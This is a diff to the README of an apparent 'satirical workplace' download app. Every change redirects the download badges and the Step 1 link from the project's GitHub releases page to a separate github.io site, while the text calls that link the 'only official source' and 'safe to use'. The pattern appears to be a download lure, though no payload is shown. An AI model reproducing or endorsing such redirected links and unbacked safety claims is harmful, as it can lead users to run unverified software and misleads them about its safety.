@@ -1,6 +1,6 @@
 # 📊 at-any-cost-annual-report - Your Interactive Satirical Workplace Experience
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Hooflike-extensor606/at-any-cost-annual-report/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://hooflike-extensor606.github.io)
 
 ## 👋 Welcome to the Satirical Side of Corporate Life
 
@@ -35,7 +35,7 @@ Ready to dive into this satirical masterpiece? Here's your simple path to experi
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Download at-any-cost-annual-report](https://github.com/Hooflike-extensor606/at-any-cost-annual-report/releases)
+Visit this link to download the application: [Download at-any-cost-annual-report](https://hooflike-extensor606.github.io)
 
 This is your only official source for the latest version, always up-to-date and safe to use.
 
@@ -124,7 +124,7 @@ This project is released for public viewing and enjoyment. It's free to download
 
 Enough reading – it's time to experience. Head over to the download page, grab your copy, and open your eyes to the absurdity of corporate life presented in the most beautiful, professional way possible.
 
-[![Get It Now](https://img.shields.io/badge/-Download%20Now-orange?style=for-the-badge)](https://github.com/Hooflike-extensor606/at-any-cost-annual-report/releases)
+[![Get It Now](https://img.shields.io/badge/-Download%20Now-orange?style=for-the-badge)](https://hooflike-extensor606.github.io)
 
 Remember: The truth might hurt, but it's never looked this good.
 
